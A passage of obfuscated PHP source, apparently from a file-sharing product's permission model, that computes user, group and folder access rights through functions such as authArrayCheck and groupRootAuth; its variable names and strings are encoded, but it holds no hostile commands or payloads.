$…´¼¸‚õ[419] => $…´¼¸‚õ[523], $…´¼¸‚õ[33] => $…´¼¸‚õ[562], $…´¼¸‚õ[527] => $°üøÚãğ[$…´¼¸‚õ[534]], $…´¼¸‚õ[1837] => $°üøÚãğ[$…´¼¸‚õ[1837]], $…´¼¸‚õ[531] => $°üøÚãğ[$…´¼¸‚õ[440]], $…´¼¸‚õ[2017] => array($éÃ¸øŸº)); $¿Ü—ŸÜ[$œ°¤¶•¡[$…´¼¸‚õ[410]]] = $œ°¤¶•¡; } } $”ŠÇœÇ· = array(); $ğ±İŒÛË = $this->getAllChildren($â“¼¢ºâ); foreach ($ğ±İŒÛË as $·Ö¬™ğ¶) { $ÏÏÎÙªÍ = !1; foreach ($·Ö¬™ğ¶[$…´¼¸‚õ[2017]] as $ªŠŠ˜…) { if ($ªŠŠ˜…[$…´¼¸‚õ[1665]]) { if ($ªŠŠ˜…[$…´¼¸‚õ[1665]] == $ù£×™´ø) { $ÏÏÎÙªÍ = !0; break; } } if ($ªŠŠ˜…[$…´¼¸‚õ[1837]]) { if ($this->groupContainUser($ªŠŠ˜…[$…´¼¸‚õ[1837]], $ù£×™´ø)) { $ÏÏÎÙªÍ = !0; break; } } } if ($ÏÏÎÙªÍ) { $”ŠÇœÇ·[] = $·Ö¬™ğ¶; } $éıç±Áæ = $·Ö¬™ğ¶[$…´¼¸‚õ[410]]; if (isset($¿Ü—ŸÜ[$éıç±Áæ])) { $·Ö¬™ğ¶[$…´¼¸‚õ[2017]][] = $¿Ü—ŸÜ[$éıç±Áæ][0]; $¿Ü—ŸÜ[$éıç±Áæ] = !1; } } $¿Ü—ŸÜ = array_filter(array_values($¿Ü—ŸÜ)); $”ŠÇœÇ· = array_merge($¿Ü—ŸÜ, $”ŠÇœÇ·); return $”ŠÇœÇ·; } public function setAllChildrenByUser($¸œşòÃ‘, $Åæ®ëš, $¡’Ö×ğÙ) { $İáÍ‰ÛÍ =& $_SERVER[™¾ÇÙ¯¹]; $…Ò¿â€ù = $this->getAllChildrenByUser($¸œşòÃ‘, $Åæ®ëš); if (!$¡’Ö×ğÙ || !$…Ò¿â€ù) { return !1; } foreach ($…Ò¿â€ù as $¶¶ÏŞ§) { $ßË·ÛÚ = array(); foreach ($¶¶ÏŞ§[$İáÍ‰ÛÍ[2017]] as $êÅšĞú) { $üü¸¡ = $êÅšĞú[$İáÍ‰ÛÍ[475]]; $ÓÓ»ª¶À = $êÅšĞú[$İáÍ‰ÛÍ[1665]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Ò›„ı£Ï = $êÅšĞú[$İáÍ‰ÛÍ[1665]] ? $êÅšĞú[$İáÍ‰ÛÍ[1665]] : $êÅšĞú[$İáÍ‰ÛÍ[1837]]; if ($êÅšĞú[$İáÍ‰ÛÍ[1665]] && $êÅšĞú[$İáÍ‰ÛÍ[1665]] == $Åæ®ëš) { continue; } $ßË·ÛÚ[] = array($İáÍ‰ÛÍ[410] => $¶¶ÏŞ§[$İáÍ‰ÛÍ[410]], $İáÍ‰ÛÍ[419] => $ÓÓ»ª¶À, $İáÍ‰ÛÍ[513] => intval($Ò›„ı£Ï), $İáÍ‰ÛÍ[1941] => isset($üü¸¡[$İáÍ‰ÛÍ[407]]) ? intval($üü¸¡[$İáÍ‰ÛÍ[407]]) : 0, $İáÍ‰ÛÍ[1997] => isset($üü¸¡[$İáÍ‰ÛÍ[1997]]) ? intval($üü¸¡[$İáÍ‰ÛÍ[1997]]) : -1); } $ßË·ÛÚ[] = array($İáÍ‰ÛÍ[410] => $¶¶ÏŞ§[$İáÍ‰ÛÍ[410]], $İáÍ‰ÛÍ[419] => SourceModel::TYPE_USER, $İáÍ‰ÛÍ[513] => intval($Åæ®ëš), $İáÍ‰ÛÍ[1941] => intval($¡’Ö×ğÙ), $İáÍ‰ÛÍ[1997] => -1); $this->where(array($İáÍ‰ÛÍ[425] => $¶¶ÏŞ§[$İáÍ‰ÛÍ[410]]))->delete(); $this->addAll($ßË·ÛÚ); } return !0; } public function get($Ë´“±ı³) { $œ÷ğ»® = $this->getSourceList(array($Ë´“±ı³), !0); return $œ÷ğ»®[0]; } public function getSourceList($›·ŒöÍ¦, $Ÿ—ëİ¼ = false, $Á†±š¤ß = false) { $¡Å€š®¾ =& $_SERVER[™¾ÇÙ¯¹]; if (!$›·ŒöÍ¦) { return array(); } $Ò²±ÄÁ = Model($¡Å€š®¾[1335]); if (!$Ÿ—ëİ¼ && count($›·ŒöÍ¦) == 1) { $Ÿ—ëİ¼ = array(); $Ÿ—ëİ¼[$›·ŒöÍ¦[0]] = $Ò²±ÄÁ->sourceInfo($›·ŒöÍ¦[0]); } if (!$Ÿ—ëİ¼) { $Í•çÎÜû = array($¡Å€š®¾[425] => array($¡Å€š®¾[426], $›·ŒöÍ¦)); $Ÿ—ëİ¼ = $Ò²±ÄÁ->field($¡Å€š®¾[2021])->where($Í•çÎÜû)->select(); $Ÿ—ëİ¼ = array_to_keyvalue($Ÿ—ëİ¼, $¡Å€š®¾[410]); } $Ï™İÃÂ = $›·ŒöÍ¦; foreach ($Ÿ—ëİ¼ as $üª®ñÖæ => $ŒÆêõØ…) { $ÍşÍ¬ßÕ = $Ò²±ÄÁ->parentLevelArray($ŒÆêõØ…[$¡Å€š®¾[529]]); $Ï™İÃÂ = array_merge($Ï™İÃÂ, array($üª®ñÖæ), array_reverse($ÍşÍ¬ßÕ)); } $Ï™İÃÂ = array_values(array_unique($Ï™İÃÂ)); if (!$Ï™İÃÂ) { return array(); } $ê·ÅÃö‚ = $this->sourceAuthSelect($Ï™İÃÂ); $ŞÄ¢æÛ = array(); foreach ($Ï™İÃÂ as $ßç¨ÙÅ) { if (isset($ê·ÅÃö‚[$ßç¨ÙÅ])) { $ŞÄ¢æÛ[$ßç¨ÙÅ] = $ê·ÅÃö‚[$ßç¨ÙÅ]; } } $Û³ê¯İ = $this->userIsRoot($Á†±š¤ß); $åÜ÷˜˜Ñ = AuthModel::authAll(); $«·°¶¢ = array($¡Å€š®¾[422] => $åÜ÷˜˜Ñ, $¡Å€š®¾[2022] => array($¡Å€š®¾[427] => 0, $¡Å€š®¾[1843] => $åÜ÷˜˜Ñ, $¡Å€š®¾[428] => LNG($¡Å€š®¾[2023]), $¡Å€š®¾[1860] => $¡Å€š®¾[2024])); $¢£óÇ¹¬ = array(); foreach ($Ÿ—ëİ¼ as $ßç¨ÙÅ => $çª••Î) { if ($Û³ê¯İ && $GLOBALS[$¡Å€š®¾[6]][$¡Å€š®¾[1856]]) { $¢£óÇ¹¬[$ßç¨ÙÅ] = $«·°¶¢; continue; } $¢£óÇ¹¬[$ßç¨ÙÅ] = $this->makeSourceAuth($çª••Î, $ŞÄ¢æÛ, $Á†±š¤ß); } return $¢£óÇ¹¬; } public function authDeepCheck($€İ¤…¡ , $˜À¡•ù° = false) { $·¸£ûÓ¯ =& $_SERVER[™¾ÇÙ¯¹]; $˜À¡•ù° = $˜À¡•ù° ? $˜À¡•ù° : USER_ID; $³î€ªä÷ = $this->makeAuthDeep($˜À¡•ù°); if (!in_array($€İ¤…¡ , $³î€ªä÷[$·¸£ûÓ¯[2025]])) { return !1; } $ìëÕÕÖ¸ = array(); foreach ($³î€ªä÷[$·¸£ûÓ¯[2026]] as $ÙßãÆ­ß => $ŞôôÇèş) { if (!in_array($€İ¤…¡ , $ŞôôÇèş)) { continue; } $ìëÕÕÖ¸[] = $ÙßãÆ­ß; } if (!$ìëÕÕÖ¸) { return !1; } $Âó¸³Á = $ìëÕÕÖ¸ ? $ìëÕÕÖ¸[0] : $€İ¤…¡ ; return array($·¸£ûÓ¯[422] => -1, $·¸£ûÓ¯[475] => array($·¸£ûÓ¯[427] => $·¸£ûÓ¯[1198], $·¸£ûÓ¯[1843] => $·¸£ûÓ¯[197], $·¸£ûÓ¯[428] => LNG($·¸£ûÓ¯[2027]), $·¸£ûÓ¯[1860] => $·¸£ûÓ¯[2028]), $·¸£ûÓ¯[2029] => LNG($·¸£ûÓ¯[2030]), $·¸£ûÓ¯[2031] => $this->sourceAuthInfo($Âó¸³Á)); } protected function makeAuthDeep($úã­ˆ–” = false) { $ÒÀßÎê¨ =& $_SERVER[™¾ÇÙ¯¹]; static $Â³øŠÂû = array(); $úã­ˆ–” = $úã­ˆ–” ? $úã­ˆ–” : USER_ID; if (isset($Â³øŠÂû[$úã­ˆ–”])) { return $Â³øŠÂû[$úã­ˆ–”]; } $¼‚’äñ = Model($ÒÀßÎê¨[2032])->listData(); $”À›ÚÛÃ = array(); foreach ($¼‚’äñ as $¬´ä¢¨œ) { if ($¬´ä¢¨œ[$ÒÀßÎê¨[421]] == 0 && $¬´ä¢¨œ[$ÒÀßÎê¨[1859]] == $ÒÀßÎê¨[88]) { $”À›ÚÛÃ[] = $¬´ä¢¨œ[$ÒÀßÎê¨[407]]; } } $µËğèıé = $this->userGroupParents($úã­ˆ–”); $‘ô¶œ’• = array($ÒÀßÎê¨[419] => SourceModel::TYPE_USER, $ÒÀßÎê¨[513] => $úã­ˆ–”); if ($µËğèıé) { $‘ô¶œ’• = array(array($ÒÀßÎê¨[419] => SourceModel::TYPE_USER, $ÒÀßÎê¨[513] => $úã­ˆ–”), array($ÒÀßÎê¨[419] => SourceModel::TYPE_GROUP, $ÒÀßÎê¨[513] => array($ÒÀßÎê¨[426], $µËğèıé)), $ÒÀßÎê¨[1008] => $ÒÀßÎê¨[1935]); } $ò³Ê÷³ã = $this->field($ÒÀßÎê¨[2033])->where($‘ô¶œ’•)->select(); $„Ÿ‘”Í¦ = array(); $áµ¼‘ = array_to_keyvalue_group($ò³Ê÷³ã, $ÒÀßÎê¨[410]); foreach ($áµ¼‘ as $Ó»íÒáÉ => $éôÏÆô) { $ÒÆ»ÙÂñ = $this->authArrayCheck($éôÏÆô, $úã­ˆ–”); if ($ÒÆ»ÙÂñ[$ÒÀßÎê¨[422]] > 0) { $„Ÿ‘”Í¦[] = $Ó»íÒáÉ . $ÒÀßÎê¨[12]; } } if ($µËğèıé) { $ÃØÛ˜ĞÑ = Model($ÒÀßÎê¨[530]); foreach ($µËğèıé as $·ÄÔñí§) { $„õÃÎø¸ = $ÃØÛ˜ĞÑ->getInfo($·ÄÔñí§); if (!$„õÃÎø¸ || !is_array($„õÃÎø¸[$ÒÀßÎê¨[86]])) { continue; } $„Ÿ‘”Í¦[] = $„õÃÎø¸[$ÒÀßÎê¨[86]][$ÒÀßÎê¨[410]]; } } $òÂ©ø = array(); $ªşŠÄ¿ä = $µËğèıé; $ßìÅÏö¥ = Model($ÒÀßÎê¨[1335]); $ÃØÛ˜ĞÑ = Model($ÒÀßÎê¨[530]); $¬‘·µ×” = array(); $œ«÷ïùş = array(); $Õ¤ğ†áÈ = array(); $ù˜ĞŠÚ = array(); if ($„Ÿ‘”Í¦) { $ÛŞ¡½Ç— = $ßìÅÏö¥->where(array($ÒÀßÎê¨[410] => array($ÒÀßÎê¨[426], $„Ÿ‘”Í¦)))->select(); foreach ($ÛŞ¡½Ç— as $£òÇÒ‘ã) { $Ğç¦°ú = $ßìÅÏö¥->parentLevelArray($£òÇÒ‘ã[$ÒÀßÎê¨[529]]); $òÂ©ø = array_merge($òÂ©ø, $Ğç¦°ú); $ªşŠÄ¿ä[] = $£òÇÒ‘ã[$ÒÀßÎê¨[513]]; $¬‘·µ×”[$£òÇÒ‘ã[$ÒÀßÎê¨[410]]] = $Ğç¦°ú; $œ«÷ïùş[$£òÇÒ‘ã[$ÒÀßÎê¨[410]]] = $£òÇÒ‘ã[$ÒÀßÎê¨[513]]; } } $ªşŠÄ¿ä = array_values(array_unique($ªşŠÄ¿ä)); $âå‹ùÈƒ = $ªşŠÄ¿ä; foreach ($âå‹ùÈƒ as $·ÄÔñí§) { $„õÃÎø¸ = $ÃØÛ˜ĞÑ->getInfo($·ÄÔñí§); $Ğç¦°ú = $ßìÅÏö¥->parentLevelArray($„õÃÎø¸[$ÒÀßÎê¨[529]]); $ªşŠÄ¿ä = array_merge($ªşŠÄ¿ä, $Ğç¦°ú); } $ªşŠÄ¿ä = array_values(array_unique($ªşŠÄ¿ä)); foreach ($ªşŠÄ¿ä as $·ÄÔñí§) { $„õÃÎø¸ = $ÃØÛ˜ĞÑ->getInfo($·ÄÔñí§); $òÂ©ø[] = $„õÃÎø¸[$ÒÀßÎê¨[86]][$ÒÀßÎê¨[410]]; $Õ¤ğ†áÈ[$·ÄÔñí§] = $„õÃÎø¸[$ÒÀßÎê¨[86]][$ÒÀßÎê¨[410]]; $ù˜ĞŠÚ[$·ÄÔñí§] = $ßìÅÏö¥->parentLevelArray($„õÃÎø¸[$ÒÀßÎê¨[529]]); } foreach ($¬‘·µ×” as $½·Âê¢ => $®¶çˆ³º) { $ñ…ìßŒ’ = $œ«÷ïùş[$½·Âê¢]; if (!$ñ…ìßŒ’ || !$Õ¤ğ†áÈ[$ñ…ìßŒ’]) { continue; } $©Ë¡ãÔÔ = array(); foreach ($ù˜ĞŠÚ[$ñ…ìßŒ’] as $·ÄÔñí§) { $©Ë¡ãÔÔ[] = $Õ¤ğ†áÈ[$·ÄÔñí§]; } $¬‘·µ×”[$½·Âê¢] = array_merge($©Ë¡ãÔÔ, $®¶çˆ³º); } $òÂ©ø = array_values(array_unique($òÂ©ø)); $“é¯Šíï = array($ÒÀßÎê¨[2025] => $òÂ©ø, $ÒÀßÎê¨[2026] => $¬‘·µ×”); $Â³øŠÂû[$úã­ˆ–”] = $“é¯Šíï; return $“é¯Šíï; } private function makeSourceAuth($Èöğ¤º, $Œ‹Ã·×•, $‚î›…ëğ = false) { $ı¨ÚŠ¤½ =& $_SERVER[™¾ÇÙ¯¹]; $ÎÉ¦Ô = $ı¨ÚŠ¤½[88]; $…§ø‹è = $Èöğ¤º[$ı¨ÚŠ¤½[513]]; $½¦¿¿Ù = $Èöğ¤º[$ı¨ÚŠ¤½[419]] == SourceModel::TYPE_GROUP; $ˆÍ¿Ë‹² = $½¦¿¿Ù ? $this->groupRootAuth($…§ø‹è, $‚î›…ëğ) : !1; if ($ˆÍ¿Ë‹² && Model($ı¨ÚŠ¤½[515])->authCheckAction($ˆÍ¿Ë‹²[$ı¨ÚŠ¤½[421]], $ı¨ÚŠ¤½[1858])) { return $this->groupAuthInfo($ˆÍ¿Ë‹², $…§ø‹è); } $ò²Ä¸³ = Model($ı¨ÚŠ¤½[1335])->parentLevelArray($Èöğ¤º[$ı¨ÚŠ¤½[529]]); $ò²Ä¸³ = array_merge(array($Èöğ¤º[$ı¨ÚŠ¤½[410]]), array_reverse($ò²Ä¸³)); $®óåÄ¾å = !1; foreach ($ò²Ä¸³ as $öˆÛ€‚ ) { if (!isset($Œ‹Ã·×•[$öˆÛ€‚ ])) { continue; } $ÎïñÔüà = $this->authMake($Œ‹Ã·×•[$öˆÛ€‚ ], $‚î›…ëğ); if ($ÎïñÔüà[$ı¨ÚŠ¤½[475]]) { $®óåÄ¾å = $ÎïñÔüà; break; } } if (!$½¦¿¿Ù) { return $®óåÄ¾å; } if (!$®óåÄ¾å && $ˆÍ¿Ë‹²) { $®óåÄ¾å = $this->groupAuthInfo($ˆÍ¿Ë‹², $…§ø‹è); } if (!$®óåÄ¾å) { $ùïÔœèñ = Model($ı¨ÚŠ¤½[530])->getInfo($…§ø‹è); $îî£Ù = explode($ı¨ÚŠ¤½[50], trim($ùïÔœèñ[$ı¨ÚŠ¤½[529]], $ı¨ÚŠ¤½[50])); $îî£Ù = array_reverse($îî£Ù); foreach ($îî£Ù as $³¬í×½Ë) { if ($³¬í×½Ë == $ı¨ÚŠ¤½[197] || $³¬í×½Ë == $ÎÉ¦Ô) { continue; } $¤ñÙÆ¾Ş = $this->groupRootAuth($³¬í×½Ë, $‚î›…ëğ); if (!$¤ñÙÆ¾Ş) { continue; } $®óåÄ¾å = $this->groupAuthInfo($¤ñÙÆ¾Ş, $³¬í×½Ë); break; } } if (!$®óåÄ¾å || $®óåÄ¾å[$ı¨ÚŠ¤½[422]] <= 0) { $«ñÁ–°ë = $this->authDeepCheck($Èöğ¤º[$ı¨ÚŠ¤½[410]], $‚î›…ëğ); if ($«ñÁ–°ë) { $®óåÄ¾å = $«ñÁ–°ë; } } return $®óåÄ¾å; } private function userIsRoot($¯¾«¦õÄ = false) { $¶É™²õş =& $_SERVER[™¾ÇÙ¯¹]; if (!$¯¾«¦õÄ && _get($GLOBALS, $¶É™²õş[511])) { return !0; } $è„Ú¾‚Ò = Model($¶É™²õş[543])->getInfo($¯¾«¦õÄ); $åÙÈĞ¢ = Model($¶É™²õş[2034])->listData($è„Ú¾‚Ò[$¶É™²õş[1544]]); if ($åÙÈĞ¢ && $åÙÈĞ¢[$¶É™²õş[519]][$¶É™²õş[2035]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ö¢€Ï¨Í) { $éÚôòŸÊ =& $_SERVER[™¾ÇÙ¯¹]; $Çè–¬¦ç = Model($éÚôòŸÊ[1335]); $íšüÔÍ© = $Çè–¬¦ç->sourceInfo($ö¢€Ï¨Í); if (!$íšüÔÍ©) { return !1; } $Çè–¬¦ç->groupPathDisplay($íšüÔÍ©); $Ø»Ç…Ñ = array($íšüÔÍ©); $Ø»Ç…Ñ = $Çè–¬¦ç->_listAppendPath($Ø»Ç…Ñ); $íšüÔÍ© = $Ø»Ç…Ñ[0]; $¨ÇÕÈÑÓ = $íšüÔÍ©[$éÚôòŸÊ[527]]; if (isset($íšüÔÍ©[$éÚôòŸÊ[535]])) { $­œ°÷æÈ = explode($éÚôòŸÊ[8], trim($íšüÔÍ©[$éÚôòŸÊ[527]], $éÚôòŸÊ[8])); array_shift($­œ°÷æÈ); $¨ÇÕÈÑÓ = $íšüÔÍ©[$éÚôòŸÊ[533]] . $éÚôòŸÊ[2036] . implode($éÚôòŸÊ[8], $­œ°÷æÈ); } return array($éÚôòŸÊ[428] => $íšüÔÍ©[$éÚôòŸÊ[32]], $éÚôòŸÊ[84] => KodIO::make($íšüÔÍ©[$éÚôòŸÊ[410]]), $éÚôòŸÊ[2037] => $¨ÇÕÈÑÓ); } private function groupAuthInfo($÷¬•Ë÷È, $ä¢¡òñ¹) { $±§Æáô =& $_SERVER[™¾ÇÙ¯¹]; $˜Àé¢û± = Model($±§Æáô[530])->getInfo($ä¢¡òñ¹); return array($±§Æáô[2038] => intval($÷¬•Ë÷È[$±§Æáô[421]]), $±§Æáô[2022] => $÷¬•Ë÷È, $±§Æáô[2039] => LNG($±§Æáô[2040]), $±§Æáô[2031] => array($±§Æáô[428] => $˜Àé¢û±[$±§Æáô[32]], $±§Æáô[84] => KodIO::make($˜Àé¢û±[$±§Æáô[86]][$±§Æáô[410]]), $±§Æáô[2037] => $˜Àé¢û±[$±§Æáô[534]])); } protected function groupRootAuth($ŒÎ˜è—ì, $ƒÎÔ€µŒ = false) { $óèçĞÍ° =& $_SERVER[™¾ÇÙ¯¹]; $ƒÎÔ€µŒ = $ƒÎÔ€µŒ ? $ƒÎÔ€µŒ : USER_ID; $Çá‘Î— = $ƒÎÔ€µŒ . $óèçĞÍ°[2041] . $ŒÎ˜è—ì; static $ò½ğ£î¹ = array(); if (isset($ò½ğ£î¹[$Çá‘Î—])) { return $ò½ğ£î¹[$Çá‘Î—]; } $Œ‘çú¯Á = Model($óèçĞÍ°[530])->getInfo($ŒÎ˜è—ì); $åï–ñ„¬ = $this->userGroupList($ƒÎÔ€µŒ); $ÛıÛÃš» = isset($åï–ñ„¬[$ŒÎ˜è—ì]) ? $åï–ñ„¬[$ŒÎ˜è—ì][$óèçĞÍ°[421]] : !1; if ($ÛıÛÃš» && Model($óèçĞÍ°[515])->authCheckAction($ÛıÛÃš»[$óèçĞÍ°[421]], $óèçĞÍ°[1858])) { $ò½ğ£î¹[$Çá‘Î—] = $ÛıÛÃš»; return $ÛıÛÃš»; } $‰«½œŸƒ = $this->sourceAuthSelect($Œ‘çú¯Á[$óèçĞÍ°[86]][$óèçĞÍ°[410]]); $†›÷¨Ñ† = $‰«½œŸƒ ? $this->authMake($‰«½œŸƒ, $ƒÎÔ€µŒ) : !1; $Îƒ±è·Ä = $†›÷¨Ñ† ? $†›÷¨Ñ†[$óèçĞÍ°[475]] : !1; $ò½ğ£î¹[$Çá‘Î—] = $Îƒ±è·Ä ? $Îƒ±è·Ä : $ÛıÛÃš»; return $ò½ğ£î¹[$Çá‘Î—]; } public function authOwnerApply($ˆ­ûë) { $ËÇÄƒ˜â =& $_SERVER[™¾ÇÙ¯¹]; if (empty($ˆ­ûë[$ËÇÄƒ˜â[421]]) || isset($ˆ­ûë[$ËÇÄƒ˜â[2042]]) && $ˆ­ûë[$ËÇÄƒ˜â[2042]]) { return $ˆ­ûë; } if (AuthModel::authCheckRoot($ˆ­ûë[$ËÇÄƒ˜â[421]][$ËÇÄƒ˜â[422]])) { return $ˆ­ûë; } $ä×õ¦¶ = Model($ËÇÄƒ˜â[1335])->parentLevelArray($ˆ­ûë[$ËÇÄƒ˜â[529]]); $ä×õ¦¶ = array_merge(array($ˆ­ûë[$ËÇÄƒ˜â[410]]), array_reverse($ä×õ¦¶)); $¶İõ¦ü¦ = $this->sourceAuthSelect($ä×õ¦¶); $¸ïª¾í÷ = array(); $‘Ï”•şÈ = array(); foreach ($¶İõ¦ü¦ as $ö—Ñ‰ÜŸ => $ıÚ’ŸÏš) { $Ÿ›°éİ = $this->authFolderOwnerUser($ıÚ’ŸÏš); $¸ïª¾í÷[$ö—Ñ‰ÜŸ] = $Ÿ›°éİ; $‘Ï”•şÈ = array_merge($‘Ï”•şÈ, $Ÿ›°éİ[$ËÇÄƒ˜â[608]]); if ($Ÿ›°éİ[$ËÇÄƒ˜â[2043]]) { break; } } if (count($‘Ï”•şÈ) == 0) { $‘Ï”•şÈ = $this->authFolderOwnerGroup($ˆ­ûë[$ËÇÄƒ˜â[513]]); } $‘Ï”•şÈ = array_unique($‘Ï”•şÈ); if (AuthModel::authCheckRoot($ˆ­ûë[$ËÇÄƒ˜â[421]][$ËÇÄƒ˜â[422]])) { $‘Ï”•şÈ[] = USER_ID; } $ˆ­ûë[$ËÇÄƒ˜â[421]][$ËÇÄƒ˜â[2044]] = Model($ËÇÄƒ˜â[521])->userListInfo($‘Ï”•şÈ); return $ˆ­ûë; } private function authFolderOwnerGroup($ñ´şÏ„Ğ) { $ù÷»ôá› =& $_SERVER[™¾ÇÙ¯¹]; $‡‰‰š¬Ñ = Model($ù÷»ôá›[1927])->where(array($ù÷»ôá›[1837] => $ñ´şÏ„Ğ))->select(); $÷âı«‹« = array(); if (!$‡‰‰š¬Ñ) { return $÷âı«‹«; } foreach ($‡‰‰š¬Ñ as $¡İ”Ç‘) { $Æ«¶ĞñÖ = $this->authInfo($¡İ”Ç‘); if (AuthModel::authCheckRoot($Æ«¶ĞñÖ[$ù÷»ôá›[421]])) { $÷âı«‹«[] = $¡İ”Ç‘[$ù÷»ôá›[1665]]; } } return $÷âı«‹«; } private function authFolderOwnerUser($Ç¦Õßë) { $•Ä””Ü³ =& $_SERVER[™¾ÇÙ¯¹]; $–›¨áúü = array(); $Ö•€œù = !1; foreach ($Ç¦Õßë as $ÂòÌ„àş) { $·çÙ©« = $this->authInfo($ÂòÌ„àş); if ($ÂòÌ„àş[$•Ä””Ü³[513]] == $•Ä””Ü³[197]) { $Ö•€œù = !0; } if ($ÂòÌ„àş[$•Ä””Ü³[419]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($·çÙ©«[$•Ä””Ü³[421]])) { $–›¨áúü[] = $ÂòÌ„àş[$•Ä””Ü³[513]]; } } } return array($•Ä””Ü³[608] => $–›¨áúü, $•Ä””Ü³[2043] => $Ö•€œù); } public function authMake($ÈªœÑÕ, $ì†Ÿš¿Œ = false) { $¯ãô¢Àş =& $_SERVER[™¾ÇÙ¯¹]; $ÙŠÃº” = $this->authArrayCheck($ÈªœÑÕ, $ì†Ÿš¿Œ); if ($ÙŠÃº”[$¯ãô¢Àş[2045]]) { $ÙŠÃº”[$¯ãô¢Àş[2045]] = $this->sourceAuthInfo($ÙŠÃº”[$¯ãô¢Àş[2045]]); } return $ÙŠÃº”; } public function authArrayCheck($îµ†¡°, $â˜–”†À = false) { $’½åÀßÍ =& $_SERVER[™¾ÇÙ¯¹]; if (!$îµ†¡°) { return array($’½åÀßÍ[422] => 0, $’½åÀßÍ[475] => !1); } $â˜–”†À = $â˜–”†À ? $â˜–”†À : USER_ID; $Ë÷ìä = 0; $é—”·¬û = 0; $Ç¤˜¡Á = 0; $¡÷åëîû = 0; $ÚåãğÉÌ = 0; $ŞĞ¨æ˜‹ = 0; $½áˆÍØÒ = 1000; $Ù¼€ïªÒ = 0; $³¬×™Á = 0; $Ê­›âëÎ = 0; $Ó‚ŞÇ¡ = 0; $†“œÉ¦ = array($’½åÀßÍ[410] => 0); foreach ($îµ†¡° as $†“œÉ¦) { $’ğã¬š¡ = $this->authInfo($†“œÉ¦); if (!$’ğã¬š¡) { continue; } $ÙÅÙĞä = $†“œÉ¦[$’½åÀßÍ[513]]; $ËÀ…Í”¬ = intval($’ğã¬š¡[$’½åÀßÍ[421]]); if ($†“œÉ¦[$’½åÀßÍ[419]] == SourceModel::TYPE_USER && $ÙÅÙĞä == $â˜–”†À) { $Ë÷ìä = !0; $Ç¤˜¡Á = $’ğã¬š¡; $é—”·¬û = $ËÀ…Í”¬; } else { if ($†“œÉ¦[$’½åÀßÍ[419]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÙÅÙĞä, $â˜–”†À)) { $¡÷åëîû = !0; $å“¯öâ = $this->groupStepToUserGroup($ÙÅÙĞä, $â˜–”†À); if ($å“¯öâ < $½áˆÍØÒ) { $½áˆÍØÒ = $å“¯öâ; $ÚåãğÉÌ = $ËÀ…Í”¬; $ŞĞ¨æ˜‹ = $’ğã¬š¡; $Ù¼€ïªÒ = $ÙÅÙĞä; } if ($å“¯öâ == $½áˆÍØÒ && $ËÀ…Í”¬ >= $ÚåãğÉÌ) { $ÚåãğÉÌ = $ËÀ…Í”¬; $ŞĞ¨æ˜‹ = $’ğã¬š¡; $Ù¼€ïªÒ = $ÙÅÙĞä; } } else { if ($ÙÅÙĞä == $’½åÀßÍ[197]) { $³¬×™Á = !0; $Ó‚ŞÇ¡ = $’ğã¬š¡; $Ê­›âëÎ = $ËÀ…Í”¬; } } } } if ($Ë÷ìä) { $ğ‰¿®›É = $é—”·¬û; $’ğã¬š¡ = $Ç¤˜¡Á; $€×Ê¶âĞ = LNG($’½åÀßÍ[2046]); } else { if ($¡÷åëîû) { $ğ‰¿®›É = $ÚåãğÉÌ; $’ğã¬š¡ = $ŞĞ¨æ˜‹; $ğ¨ƒÚ¿Ø = Model($’½åÀßÍ[530])->getInfo($Ù¼€ïªÒ); $€×Ê¶âĞ = $’½åÀßÍ[162] . $ğ¨ƒÚ¿Ø[$’½åÀßÍ[534]] . $’½åÀßÍ[2047] . LNG($’½åÀßÍ[2048]); } else { if ($³¬×™Á) { $ğ‰¿®›É = $Ê­›âëÎ; $’ğã¬š¡ = $Ó‚ŞÇ¡; $€×Ê¶âĞ = LNG($’½åÀßÍ[2019]); } else { $ğ‰¿®›É = 0; $’ğã¬š¡ = !1; $€×Ê¶âĞ = $’½åÀßÍ[12]; } } } $¾ùˆ®óÈ = array($’½åÀßÍ[2038] => intval($ğ‰¿®›É), $’½åÀßÍ[2022] => $’ğã¬š¡, $’½åÀßÍ[2039] => $€×Ê¶âĞ, $’½åÀßÍ[2031] => $†“œÉ¦[$’½åÀßÍ[410]]); return $¾ùˆ®óÈ; } private function groupContainUser($£àÌ×é, $…—ò˜¼ = false) { return in_array($£àÌ×é, $this->userGroupParents($…—ò˜¼)); } private function groupStepToUserGroup($„áš¯Îı, $ËÍëğï = false) { $©… øãÚ =& $_SERVER[™¾ÇÙ¯¹]; $ƒï–İ˜Š = $this->userGroupList($ËÍëğï); $·’û‘À¦ = 1000; $š–ò¤Æ = $GLOBALS[$©… øãÚ[6]][$©… øãÚ[89]][$©… øãÚ[1940]] == 1; $ªöÃùñ´ = $š–ò¤Æ ? 3 : 2; foreach ($ƒï–İ˜Š as $âªÊİ–) { if ($âªÊİ–[$©… øãÚ[1837]] == $„áš¯Îı) { return 0; } $àÖ½ô©á = explode($©… øãÚ[50], trim($âªÊİ–[$©… øãÚ[529]], $©… øãÚ[50])); if ($àÖ½ô©á[0] == $©… øãÚ[197] && count($àÖ½ô©á) > $ªöÃùñ´) { $¤øÍÅØ = array_reverse(array_slice($àÖ½ô©á, $ªöÃùñ´)); $¨·İøö = array_search($„áš¯Îı, $¤øÍÅØ); if ($¨·İøö !== !1 && $¨·İøö + 1 <= $·’û‘À¦) { $·’û‘À¦ = $¨·İøö + 1; } } } return $·’û‘À¦; } private function userGroupList($·şÃ¯¨§ = false) { $¯¬ª·ï‘ =& $_SERVER[™¾ÇÙ¯¹]; static $Ùñšõö = array(); if (isset($Ùñšõö[$·şÃ¯¨§])) { return $Ùñšõö[$·şÃ¯¨§]; } $½“Î¹±¢ = Model($¯¬ª·ï‘[543])->getInfo($·şÃ¯¨§); $Ùñšõö[$·şÃ¯¨§] = array_to_keyvalue($½“Î¹±¢[$¯¬ª·ï‘[2020]], $¯¬ª·ï‘[1837]); return $Ùñšõö[$·şÃ¯¨§]; } public function userGroupParents($şÔê¬ç) { $ÛÈ¨á‹€ =& $_SERVER[™¾ÇÙ¯¹]; static $‡×•³ĞÎ = array(); $şÔê¬ç = $şÔê¬ç ? $şÔê¬ç : USER_ID; if (isset($‡×•³ĞÎ[$şÔê¬ç])) { return $‡×•³ĞÎ[$şÔê¬ç]; } $óŒàÏ˜ = $this->userGroupList($şÔê¬ç); $÷ïª¹ğ– = array(); $ö§‚İ¥– = 